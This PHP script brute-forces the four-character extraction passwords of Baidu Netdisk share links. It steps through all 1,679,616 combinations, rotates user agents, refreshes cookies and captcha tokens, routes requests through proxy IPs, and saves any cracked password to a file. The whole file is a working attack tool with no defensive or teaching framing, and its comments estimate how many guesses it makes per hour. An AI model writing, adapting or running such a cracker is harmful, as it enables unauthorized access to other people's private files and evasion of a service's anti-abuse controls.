<?php
/*
 * http://pan.baidu.com/share/verify?shareid=1418533617&uk=242193955&t=时间戳+随机三位数&bdstoken=xxxxxxxx&channel=chunlei&clienttype=0&web=1&app_id=250528&logid=base64(时间戳+随机三位数+000.+随机15-20位数)
 */

/* 共有167 9616个

每秒钟10个，
一分钟1000个，
一小时6 0000个，
十小时60 0000个，

*/

/*
 * url http://task.net/baiduyun3-ip.php?surl=jGoSqUi&start=23202&sure=1&limit=100&error=20&repeat=20
 * php baiduyun3-ip.php --surl=jGoSqUi --start=23202 --sure=1 --limit=100 --error=20 --repeat=20
 */

require_once __DIR__.'/functions.php';

// 获取参数
$data   = get_data();
$surl   = get_arr($data, 'surl');      // 要破解的百度网盘资料的surl
$start  = intval(get_arr($data, 'start', 0));    // 从哪个数字开始验证密码
$end    = intval(get_arr($data, 'end', 0));        // 验证到哪个密码
$limit  = intval(get_arr($data, 'limit', 0));      // 要破解的百度网盘资料的surl
$sure   = intval(get_arr($data, 'sure', 0)); // 是否确认
$error  = intval(get_arr($data, 'error', - 1)); //   总共有多少次请求失败就结束脚本
$repeat = intval(get_arr($data, 'repeat', - 1)); //   总共有多少次请求失败就结束脚本

if ( ! $surl)
{
	$note = <<<NOTE
NOTE需要传递参数 
sure：是否确认
surl：要破解的surl
start：从哪个数字开始
end：到哪个数字结束
limit：从开始的数字起验证多少位，如果与end参数冲突，以end参数为准，默认为1000
error：总共有多少次失败的请求后就结束脚本，默认为100次，最大为1000次
repeat：总共有多少次重复的请求后就结束脚本，默认为100次，最大为1000次
NOTE;

	output($note);
	die;
}

set_time_limit(0);

if ($error < 0 || $error > 1000)
{
	$error = 100;
}

if ($repeat < 0 || $repeat > 1000)
{
	$repeat = 100;
}

if ($start < 0)
{
	$start = 0;
}

if ( ! $limit)
{
	$limit = 1000;
}

if ( ! $end)
{
	$end = $start + $limit;
}

if ($end > 1679616)
{
	$end = 1679616;
}

$url = 'http://pan.baidu.com/share/init?surl='.$surl;
//$url        = 'www.guoyunxia.com/get_ip.php';
//$url        .= '?t='.time();
$file       = $surl.'-'.$start.'-'.$end;
$h          = init_file($file);
$limit      = pow(36, 4);
$user_agent = get_user_agent();
list($ip, $port) = get_ip();
$cookie_tmp = get_cookie($url, $user_agent, $ip, $port);

$vcode_str = get_code($cookie_tmp, $ip, $port);
// i是验证码的计数，j 是每三次换一下user-agent，k是总共失败了多少次，l是重复请求了多少次
for ($i = $start, $j = 1, $k = 0, $l = 0; $i <= $end; $i ++, $j ++)
{
	if ($k > $error)
	{
		output('请求错误的次数已经超过上限：'.$k.' > '.$error);
//		die();
		break;
	}

	if ($l > $repeat)
	{
		output('请求重复的次数已经超过上限：'.$l.' > '.$repeat);
//		die();
		break;
	}

	if ($j % 4 == 0)
	{
		$j          = 1;
		$user_agent = get_user_agent();
		$cookie_tmp = get_cookie($url, $user_agent, $ip, $port);
		$vcode_str  = get_code($cookie_tmp, $ip, $port);
	}
	$str = get_str($i);
	ll($h, $i.'---'.$str, FALSE);
	$result = get_pan($url, $cookie_tmp, $user_agent, $str, $vcode_str, $h, $ip, $port);
	$result = json_decode(trim($result), TRUE);
	$re     = FALSE;
	if ( ! $result)
	{
		$k ++;
		$j                    = 3;
		$result['user-agent'] = $user_agent;
		$result['error_num']  = $k;
	}
	if ( ! is_array($result) || ! isset($result['errno']))
	{
		$result['errno'] = 9999;
	}
	switch ($result['errno'])
	{
		case 0:
			$re = TRUE;
			break;
		case - 9:
			break;
//		case - 62:
//			// 请求验证码
////			output($headers);
//			output($result);
////			$code      = get_code($cookie_tmp);
////			$vcode_str = $code['vcode_str'];
////			get_pan($url, $cookie_tmp, $user_agent, $pwd, $vcode_str);
////			output($code);
//			die('end reason:62');
//
//			break;
		default:
			$i --;
			$l ++;
			$result['repeat_num'] = $l;
			$result['error_num']  = $k;
			break;
	}
	ll($h, $result, TRUE);
	if ($re)
	{
		$s_file = init_file($surl);

		ll($s_file, $i.'::::::ok::::::::'.$str);
		ll($h, $i.'::::::ok::::::::'.$str);
		break;
	}
}

close_file($h);
if ($end != $i)
{
	change_file($surl, $start, $end, $i);
}
die('script is over. ok!');